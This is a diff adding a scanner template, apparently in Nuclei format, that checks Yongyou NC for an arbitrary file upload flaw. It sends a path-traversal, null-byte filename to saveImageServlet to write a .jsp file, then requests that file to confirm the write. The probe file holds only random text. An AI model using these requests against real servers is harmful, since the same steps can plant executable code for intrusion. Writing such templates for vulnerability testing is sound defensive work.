@@ -1,0 +1,45 @@
+id: poc-yaml-yongyou-nc-saveimageservlet-anyfile-upload
+info:
+  name: Yongyou NC saveImageServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../{{t1}}.jsp%00"
+    headers:
+      Content-Type: application/octet-stream
+    body: "{{t2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - '!contains(body, "<")'
+          - 'contains(content_type, "application/octet-stream")'
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/portal/processxml/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
